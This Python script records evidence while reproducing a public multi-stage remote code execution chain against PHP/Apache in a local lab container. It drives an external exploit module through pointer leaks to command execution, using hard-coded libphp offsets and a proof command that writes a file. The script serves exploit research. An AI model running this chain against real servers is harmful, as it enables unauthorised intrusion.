#!/usr/bin/env python3
"""Instrumented reproduction of the 9bie public chain (step 1 evidence).

Wraps exploit.py's Target.post to record every request (shape + sha256) and every
response (raw), plus the Apache worker PID observed before/after each request via
the lab container (external observation only; no target-side instrumentation).
"""
import argparse
import hashlib
import importlib.util
import json
import os
import re
import struct
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.join(HERE, "repo")


def load_exploit():
    spec = importlib.util.spec_from_file_location("exp", os.path.join(REPO, "exploit.py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def worker_pids(container):
    try:
        out = subprocess.run(
            ["docker", "exec", container, "sh", "-c",
             "ps -eo pid,ppid,args | grep '[a]pache2'"],
            capture_output=True, text=True, timeout=10).stdout
    except Exception as e:  # pragma: no cover
        return {"error": str(e)}
    rows = []
    for line in out.strip().splitlines():
        f = line.split(None, 2)
        if len(f) >= 2:
            rows.append({"pid": int(f[0]), "ppid": int(f[1])})
    return {"procs": rows, "children": [r["pid"] for r in rows if r["ppid"] == 1]}


def summarize_parts(body, boundary):
    sep = b"--" + boundary
    segs = body.split(sep)
    parts = []
    for seg in segs[1:]:
        if seg.startswith(b"--"):
            break
        head, _, data = seg.partition(b"\r\n\r\n")
        if data.endswith(b"\r\n"):
            data = data[:-2]
        m = re.search(rb'name="([^"]*)"', head)
        fn = re.search(rb'filename="([^"]*)"', head)
        parts.append({
            "name": m.group(1).decode("latin1") if m else None,
            "filename": fn.group(1).decode("latin1") if fn else None,
            "data_len": len(data),
            "sha256_16": hashlib.sha256(data).hexdigest()[:16],
        })
    return parts


def cookie_analysis(raw, exp, dtor_offset):
    dec = exp.parse_cookie(raw)
    info = {"raw_len": len(dec)}
    if not dec:
        return info
    ptrs = []
    for i in range(len(dec) - 8):
        v = int.from_bytes(dec[i:i + 8], "little")
        if 0x7F0000000000 <= v < 0x800000000000:
            ptrs.append((i, v))
    info["ptr_count"] = len(ptrs)
    info["first_ptrs"] = [{"off": i, "val": hex(v)} for i, v in ptrs[:4]]
    # stage-1 style 2MB mode
    from collections import Counter
    c = Counter(v & ~0x1FFFFF for _, v in ptrs)
    info["top_2mb_modes"] = [[hex(k), n] for k, n in c.most_common(3)]
    # stage-2 style pDestructor at decoded offset 8
    if len(dec) >= 16:
        p = int.from_bytes(dec[8:16], "little")
        info["dec8"] = hex(p)
        info["dec8_matches_dtor_low12"] = (p & 0xFFF) == (dtor_offset & 0xFFF)
        info["dec8_implied_base"] = hex(p - dtor_offset) if p > dtor_offset else None
    info["head_hex"] = dec[:48].hex()
    return info


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:18088/index.php")
    ap.add_argument("--container", default="9bie-lab")
    ap.add_argument("--outdir", default=os.path.join(HERE, "capture"))
    ap.add_argument("--cmd", default="id>/out/p1")
    ap.add_argument("--proof-file", default=os.path.join(HERE, "lab/out/p1"))
    ap.add_argument("--profile", default="bookworm")
    ap.add_argument("--zif", default="0x465370")
    ap.add_argument("--dtor", default="0x65eb60")
    ap.add_argument("--htdata", default="0x690d8")
    ap.add_argument("--no-pre-rotate", action="store_true")
    args = ap.parse_args()

    os.makedirs(args.outdir, exist_ok=True)
    started = time.time()
    if os.path.exists(args.proof_file):
        try:
            os.unlink(args.proof_file)  # never accept a stale proof from an earlier run
        except OSError:
            subprocess.run(["docker", "exec", args.container, "rm", "-f",
                            "/out/" + os.path.basename(args.proof_file)],
                           capture_output=True, timeout=20)
    exp = load_exploit()
    zif_off, dtor_off = int(args.zif, 0), int(args.dtor, 0)
    t = exp.Target(args.url, timeout=60.0, verbose=True)
    ex = exp.Exploit(t, args.cmd, zif_offset=zif_off, dtor_offset=dtor_off,
                     htdata_offset=int(args.htdata, 0), profile=args.profile)

    state = {"seq": 0, "requests": []}
    original_post = t.post

    def recording_post(body, boundary, read_cap=1 << 20, timeout=None,
                       extra_headers=None):
        state["seq"] += 1
        n = state["seq"]
        before = worker_pids(args.container)
        meta = {
            "seq": n,
            "ts": time.time(),
            "body_len": len(body),
            "body_sha256": hashlib.sha256(body).hexdigest(),
            "boundary": boundary.decode("latin1"),
            "extra_headers": extra_headers or {},
            "worker_before": before,
            "read_cap": read_cap,
            "part_count": body.count(b"Content-Disposition: form-data"),
            "parts": summarize_parts(body, boundary),
        }
        resp = original_post(body, boundary, read_cap=read_cap, timeout=timeout,
                             extra_headers=extra_headers)
        after = worker_pids(args.container)
        meta["resp_len"] = len(resp)
        meta["resp_sha256"] = hashlib.sha256(resp).hexdigest()
        meta["worker_after"] = after
        meta["cookie"] = cookie_analysis(resp, exp, dtor_off) if b"Set-Cookie" in resp else {}
        with open(os.path.join(args.outdir, f"resp_{n:02d}.raw"), "wb") as f:
            f.write(resp)
        state["requests"].append(meta)
        print(f"[capture] #{n} len={len(body)} parts={meta['part_count']} "
              f"resp={len(resp)} workers={before.get('children')}->{after.get('children')} "
              f"cookie={meta['cookie'].get('raw_len', 0)}B ptrs={meta['cookie'].get('ptr_count', 0)}",
              flush=True)
        return resp

    t.post = recording_post

    try:
        if not args.no_pre_rotate:
            ex.rotate()
        chunk = ex.stage1()
        print(f"[+] chunk = {hex(chunk) if chunk else 0}")
        ex.rotate()
        libphp = ex.stage2()
        print(f"[+] libphp = {hex(libphp) if libphp else 0}")
        ex.rotate()
        if chunk and libphp:
            htdata = chunk + ex.htdata_offset
            zif = libphp + zif_off
            print(f"[*] HTDATA={hex(htdata)} ZIF={hex(zif)}")
            ex.stage3(htdata, zif)
        time.sleep(1.0)
        proof = ""
        if os.path.exists(args.proof_file) and os.path.getmtime(args.proof_file) >= started:
            proof = open(args.proof_file, "rb").read().decode("latin1").strip()
        state["result"] = {"chunk": hex(chunk) if chunk else None,
                           "libphp": hex(libphp) if libphp else None,
                           "proof": proof}
        print(f"PROOF: {proof}" if proof else "NO PROOF")
    finally:
        with open(os.path.join(args.outdir, "requests.json"), "w") as f:
            json.dump(state, f, indent=1)
    return 0 if state.get("result", {}).get("proof") else 1


if __name__ == "__main__":
    sys.exit(main())
